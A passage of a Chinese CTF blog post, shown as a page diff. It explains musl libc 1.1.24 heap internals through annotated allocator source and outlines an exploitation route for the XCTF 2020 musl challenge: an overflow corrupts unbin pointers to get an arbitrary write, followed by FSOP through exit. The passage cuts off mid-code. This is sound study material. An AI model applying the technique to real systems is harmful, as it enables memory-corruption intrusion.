@@ -145,198 +145,279 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">musl 1.1.24利用方式</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-04-27 20:35:56
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/musl/">musl</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.5k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>17 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>这个月干的是属实有点儿少，感觉特别迷茫，学了那么多结果比赛还是一头雾水，虽然很烦躁但是还是不能放弃啊！</p>
+<p>在starCTF的第二道题我始终找不到漏洞点在哪，下来看wp才发现使用的libc不是普通的glibc了，其实在RCTF的一道题目就是基于musl的但是无奈github的仓库当中并没有题目的源码所以没去深入了解，在starCTF过后也算是了解一下这一相较于glic更为轻量的libc了。</p>
+<p>首先本文先介绍一下这一libc</p>
+<h2 id="musl-1-1-24"><a href="#musl-1-1-24" class="headerlink" title="musl 1.1.24"></a>musl 1.1.24</h2><p>musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 Alpine Linux（做过 Docker 镜像的应该很熟悉）、OpenWrt（常用于路由器）和 Gentoo 等。</p>
+<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>这一版本的chunk结构其实是和glibc相差不大的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>psize和csize字段都有标志位（glibc 只有size字段有），但只有一种位于最低位的标志位INUSE（glibc 最低三位都有标志位）。若设置INUSE标志位（最低位为1），表示 chunk 正在被使用；若没有设置INUSE标志位（最低位为0），表示 chunk 已经被释放或者通过mmap分配的，需要通过psize的标志位来进一步判断 chunk 的状态。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure>
+
+<p>这个mal结构体很类似main_arena，里面记录着堆的信息，有三个成员：64位无符号整数binmap、链表头部数组bins和锁free_lock。binmap记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>bin 链表头部的结构如上。head和tail指针分别指向首部和尾部的 chunk，同时首部 chunk 的prev指针和尾部 chunk 的next指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，head和tail指针等于 0 或者指向链表头部自身。</p>
+<p>看mal结构可以看到有64的bin，前面32个bin是类似于small bin的结构，存放的chunk的大小是固定的，但是后面的就类似于large bin存放的是在一定范围的chunk了。</p>
+<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/malloc/malloc.c L284-L331</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. n 增加头部长度 OVERHEAD (0x10)，对齐 32 位：</span></span><br><span class="line">    <span class="comment">// *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;</span></span><br><span class="line">    <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 n 到达 MMAP_THRESHOLD (0x38000)，使用 mmap chunk</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">        [...]</span><br><span class="line">        <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 计算 n 对应的 bin 下标 i</span></span><br><span class="line">    i = bin_index_up(n);</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 3. 查找 binmap</span></span><br><span class="line">        <span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        <span class="comment">// 若所有的可用 bin 均为空，调用 expand_heap 函数延展堆空间，生成新的 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">            c = expand_heap(n);</span><br><span class="line">            [...]</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. 获取大小最接近 n 的可用 bin 下标 j</span></span><br><span class="line">        j = first_set(mask);</span><br><span class="line">        lock_bin(j);</span><br><span class="line">        c = mal.bins[j].head; <span class="comment">// c 是 bin j 链表首部的 chunk</span></span><br><span class="line">        <span class="comment">// 5. 若符合条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c</span></span><br><span class="line">        <span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">            unlock_bin(j);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        unlock_bin(j);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 回收 c 中大小超过 n 的部分</span></span><br><span class="line">    <span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    trim(c, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概步骤就是：</p>
+<ol>
+<li><p>调整n，增加头部的长度然后对齐32位</p>
+</li>
+<li><p>如果n&gt;MMAP_THRESHOLD，则使用mmap创建一块大小为n的内存返回</p>
+</li>
+<li><p>如果n&lt;=MMAP_THRESHOLD，计算n对应的bin的i，查找binmap</p>
+<p>​    如果所有可用bin都为空，那么就扩展堆空间，生存一个新的chunk</p>
+<p>​    如果存在非空的bin，则大小最接近n的bin，将bin首部的chunk返回</p>
+<p>​        如果符号pretrime条件，使用pretrime分割</p>
+<p>​        否则使用unbin从链表中取出</p>
+<p>​    最后对chunk进行trim，返回给用户</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 若 bin 只有一个 chunk，将 bin 设为空 bin</span></span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">// 取出链表中的 chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// 设置 INUSE 标志位</span></span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这其实就是取出chunk的一个操作，可以看到取出的过程中并没有检测chunk指针的合法性，这也就造成了安全隐患</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pretrim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> n1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件 1: bin j 下标大于 40</span></span><br><span class="line">    <span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 条件 2: bin j 与 i 相隔 3 个 bin 或以上，</span></span><br><span class="line">    <span class="comment">// 或者 j 等于 63 且 split 的大小大于 MMAP_THRESHOLD</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        n1 = CHUNK_SIZE(self);</span><br><span class="line">        <span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        n1 = CHUNK_SIZE(self);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 条件 3: split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin</span></span><br><span class="line">    <span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切割出一块大小为 n 的 chunk</span></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;prev = self-&gt;prev;</span><br><span class="line">    split-&gt;next = self-&gt;next;</span><br><span class="line">    split-&gt;prev-&gt;next = split;</span><br><span class="line">    split-&gt;next-&gt;prev = split;</span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1-n;</span><br><span class="line">    next-&gt;psize = n1-n;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>pretrim的作用是切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件时，pretrim从 bin 链表首部 chunk 切割出一块大小刚好符合需求的小 chunk，然后将小 chunk 分配给用户，链表首部 chunk 的位置保持不变。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件：self 的大小 n1 多于 n DONTCARE (0x10) 字节</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 self 的大小切割为 n，剩余部分成为新的 chunk split</span></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">    next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 split 释放到 bin</span></span><br><span class="line">    __bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>malloc 的最后一步是trim，主要作用是回收 chunk 超过需求大小的部分。trim将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。</p>
+<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或者 double free</span></span><br><span class="line">    <span class="comment">// #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line">    <span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">        unmap_chunk(self);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        __bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unmap_chunk</span><span class="params">(struct chunk *self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> extra = self-&gt;psize;</span><br><span class="line">    <span class="keyword">char</span> *base = (<span class="keyword">char</span> *)self - extra;</span><br><span class="line">    <span class="keyword">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">    <span class="comment">// 若 prev size 设置了 INUSE 标志位，视为 double free，crash</span></span><br><span class="line">    <span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    __munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>free 先对 chunk 进行 mmap / double free 检查。如果 chunk 的csize字段没有设置INUSE标志位，进入unmap_chunk函数检查psize字段。如果psize字段设置了INUSE标志位，视为 double free，crash；否则视为 mmap chunk，调用__munmap函数释放。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">    <span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">    <span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小</span></span><br><span class="line">    final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若下一个 chunk 的 psize 不等于 self 的 csize，则 crash</span></span><br><span class="line">    <span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">    <span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 检查 self 前后是否有空闲 chunk</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">// 去除 INUSE 标志位</span></span><br><span class="line">            self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">            next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">            <span class="comment">// 计算 final_size 对应的 bin 下标 i</span></span><br><span class="line">            i = bin_index(final_size);</span><br><span class="line">            lock_bin(i);</span><br><span class="line">            lock(mal.free_lock);</span><br><span class="line">            <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">                <span class="keyword">break</span>;  <span class="comment">// 退出循环</span></span><br><span class="line">            unlock(mal.free_lock);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向前合并空闲 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (alloc_rev(self)) &#123;  <span class="comment">// 从 bin 链表取出待合并的空闲 chunk</span></span><br><span class="line">            self = PREV_CHUNK(self);</span><br><span class="line">            size = CHUNK_SIZE(self);</span><br><span class="line">            final_size += size;</span><br><span class="line">            <span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">                reclaim = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向后合并空闲 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (alloc_fwd(next)) &#123;  <span class="comment">// 从 bin 链表取出待合并的空闲 chunk</span></span><br><span class="line">            size = CHUNK_SIZE(next);</span><br><span class="line">            final_size += size;</span><br><span class="line">            <span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">                reclaim = <span class="number">1</span>;</span><br><span class="line">            next = NEXT_CHUNK(next);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 在 binmap 中，将 bin i 设为非空 bin</span></span><br><span class="line">    <span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">        a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">    self-&gt;csize = final_size;</span><br><span class="line">    next-&gt;psize = final_size;</span><br><span class="line">    unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将 self 加入到 bin i 链表的尾部</span></span><br><span class="line">    self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">    self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">    self-&gt;next-&gt;prev = self;</span><br><span class="line">    self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">    <span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">        [...]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>__bin_chunk函数的作用是将 chunk 插入到 bin 链表中。首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。</p>
+<p>然后在musl当中的堆管理为了减少内存的使用会直接将libc和程序当中的空闲的内存当作堆内存，而glibc的堆地址一般都是位于内存中的动态内存区域。</p>
+<h2 id="XCTF-2020-PWN-musl"><a href="#XCTF-2020-PWN-musl" class="headerlink" title="XCTF_2020_PWN_musl"></a>XCTF_2020_PWN_musl</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220427153926579.png"
+                      alt="image-20220427153926579"
+                ></p>
+<p>可以看到这里确实是直接在libc和process上面有堆的地址。</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是很经典的菜单题，并且在create函数里面有一处只能运行一次的0x50的溢出，而且题目只有一处使用exit退出程序，然后show函数也只有一次。</p>
+<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>其实利用思路就很简单了，存在溢出，unbin又有如此大的安全隐患，所以就是通过溢出修改掉next指针和prev指针从而实现任意地址写，造成FSOP</p>
+<p>这里说一下怎么造成的FSOP</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_file</span><span class="params">(FILE *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	